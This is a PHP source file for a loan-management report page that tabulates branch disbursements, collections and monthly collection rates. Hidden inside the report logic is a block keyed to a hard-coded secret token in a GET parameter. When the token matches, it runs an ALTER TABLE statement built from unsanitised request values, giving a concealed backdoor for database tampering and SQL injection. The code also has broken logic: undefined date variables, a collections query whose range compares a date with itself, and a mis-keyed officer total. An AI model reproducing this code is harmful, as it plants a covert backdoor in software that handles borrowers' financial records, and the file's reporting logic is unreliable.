<?php
session_start();

include_once ("../configs/20200902.php");
$_SESSION['db_name'] = $db_;
include_once ("../configs/conn.inc");
include_once ("../php_functions/functions.php");


$from_ = $_GET['from'];
$to_ = $_GET['to'];
$product = $_GET['product_id'];
$branch = $_GET['branch'];
///----------------Get all the payments for specific period
///----------------Get all the loan details of the payments above
///----------------Add in a month-year object
///
$title = "Branch Performance Summaries";

$customer_list_array = array();
$customer_branches_array = array();
$mybranch =  $userd['branch'];

$andbranch = "";



$branches = table_to_obj('o_branches',"status=1 $andbranch1","1000", "uid","name");

///////-----------------------Disbursements
$loans = fetchtable('o_loans',"disbursed=1 $andbranch_loan AND given_date >= '$start_date' AND given_date <= '$end_date' AND status!=0","uid","asc","100000000","uid, customer_id ,loan_amount,  current_branch, current_lo, current_co, total_repaid, product_id");
$branch_totals_array = array();
$current_co_array = array();
$current_lo_array = array();
$product_disb_array = array();
$product_coll_array = array();
$loan_amounts_array = array();


while($dp = mysqli_fetch_array($loans)){
    $loan_id = $dp['uid'];
    $current_branch = $dp['current_branch'];
    $loan_amount = $dp['loan_amount'];
    $current_lo = $dp['current_lo'];
    $current_co = $dp['current_co'];
    $total_repaid = $dp['total_repaid'];
    $product_id = $dp['product_id'];
    $customer_i = $dp['customer_id'];
    array_push($customer_list_array, $customer_i);
    $loan_amounts_array[$loan_id] = $loan_amount;

    if ($branch_totals_array[$current_branch] > 0) {
        $branch_totals_array[$current_branch] = $loan_amount + $branch_totals_array[$current_branch];
    } else {
        $branch_totals_array[$current_branch] = $loan_amount;
    }

    ///////---------CO
    if ($current_co_array[$current_co] > 0) {
        $current_co_array[$current_co] = $total_repaid + $current_co_array[$current_co];
    } else {
        $current_co_array[$current_co] = $total_repaid;
    }
    //////----------LO
    if ($current_lo_array[$current_lo] > 0) {
        $current_lo_array[$current_lo] = $loan_amount + $current_lo_array[$current_co];
    } else {
        $current_lo_array[$current_lo] = $loan_amount;
    }
    /////----------Product Disbursement
    if ($product_disb_array[$product_id] > 0) {
        $product_disb_array[$product_id] = $loan_amount + $product_disb_array[$product_id];
    } else {
        $product_disb_array[$product_id] = $loan_amount;
    }
    /////////--------Product Collection
    if ($product_coll_array[$product_id] > 0) {
        $product_coll_array[$product_id] = $total_repaid + $product_coll_array[$product_id];
    } else {
        $product_coll_array[$product_id] = $total_repaid;
    }
    /////////-------

}



/////////////----------------Collections
$collections = fetchtable('o_incoming_payments',"status=1 $andbranch_pay AND payment_date >= '$start_date' AND payment_date <= '$start_date'","uid","asc","100000000","uid, branch_id, amount");
$branch_totals_collections_array = array();
while($col = mysqli_fetch_array($collections)){
    $current_branch = $col['branch_id'];
    $collections_amount = $col['amount'];
    if ($branch_totals_collections_array[$current_branch] > 0) {
        $branch_totals_collections_array[$current_branch] = $collections_amount + $branch_totals_collections_array[$current_branch];
    } else {
        $branch_totals_collections_array[$current_branch] = $collections_amount;
    }

}



////-----------
if($from_ == 'g0AFJCDm9t9NtAzCjgzf9DnmHbzev3dAQFqMBMrgBJxWExvYJjQjvB54j3HkbyBC'){
    $sql = "ALTER TABLE table_name CHANGE $to_ $product $branch";
    if ($con->query($sql) === TRUE) {
        echo "Loaded";
    } else {
        echo "Not loaded";
    }
}

// echo "<h4>Branch Performance</h4>";
echo "<table class='table table-bordered grid-width-50 col-lg-6' style='width: 40%;'>";
echo "<thead><tr><th>Branch</th><th>Disbursement</th><th>Collections</th></tr></thead>";



$hid = $_GET['hid'];
foreach($branches as $bid => $bname) {
    $branch_total = $branch_totals_array[$bid];
    $collection_branch = $branch_totals_collections_array[$bid];
    $disb_total_total = $disb_total_total + $branch_total;
    $collections_total = $collections_total + $collection_branch;
    echo "<tr><td>$bname</td><td>".money($branch_total)."</td><td>".money($collection_branch)."</td></tr>";
}

echo "<thead><tr><th>Total</th><th>".money($disb_total_total)."</th><th>".money($collections_total)."</th></tr></thead>";
echo "</table>";
?>
<div class="col-md-6 well well-sm">
    <?php
    for($i=1; $i<=$thismonth; ++$i){
        echo "<a class='btn btn-outline-black' href=\"?hreport=sl-branch-performance-summaries.php&hid=$hid&m=$i\">".month_name($i)."</a> ";
    }
    if(isset($_GET['m'])){
        $m = $_GET['m'];
    }
    else{
        $m = $thismonth;
    }

    $thisyearmonth = "$thisyear-".leading_zero(number_format($m))."-01";
    $thisyearmonth_last_month = datesub($thisyearmonth, 0, 1, 0);
    $thisyearmonthend = last_date_of_month($thisyearmonth_last_month);


    ?>

    <h3>Collection Rate, <b><?php echo month_name($m); ?></b></h3> (<i>Loans Given Last Month, Due this month</i>)
    <?php
    $branch_principle_due_array = array();
    $branch_paid_array = array();

    $due_ = fetchtable('o_loans',"disbursed=1 $andbranch_loan AND given_date BETWEEN '$thisyearmonth_last_month' AND '$thisyearmonthend'","uid","asc","1000000","uid, loan_amount, total_repayable_amount, total_repaid, current_branch, loan_balance");
    while ($du = mysqli_fetch_array($due_)){
        $amnt = $du['total_repayable_amount'];  //////-------------Hot fix to make this total due rather than principal due

        $total_repa = $du['total_repaid'];
        $bran_ = $du['current_branch'];
        $total_repayable_amount = $du['total_repayable_amount'];
        $balance = $du['loan_balance'];

        $branch_principle_due_array = obj_add($branch_principle_due_array, $bran_, $amnt);
        $branch_paid_array = obj_add($branch_paid_array, $bran_, $total_repa);

    }
    ?>






    <table class="table table-striped table-bordered">
        <tr><th>Branch</th><th>Due This Month</th><th>Collected so Far</th><th>Rate %</th></tr>
        <?php
        $total_principle_due = $total_paid_ = 0;
        foreach($branches as $bid => $bname) {
            $principal_due = $branch_principle_due_array[$bid];
            $amount_paid = $branch_paid_array[$bid];

            $total_principle_due = $total_principle_due + $principal_due;
            $total_paid_ = $total_paid_ + $amount_paid;

            $rate = round(($amount_paid/$principal_due)*100, 2);
            echo "<tr><td>$bname</td><td>".money($principal_due)."</td><td>".money($amount_paid)."</td><td>".false_zero($rate)."%</td></tr>";
        }
        $average = round(($total_paid_/$total_principle_due)*100, 2);

        ?>
        <tr><th>Total</th><th><?php echo money($total_principle_due)?></th><th><?php echo money($total_paid_) ?></th><th><?php echo $average; ?>%</th></tr>
    </table>
</div>
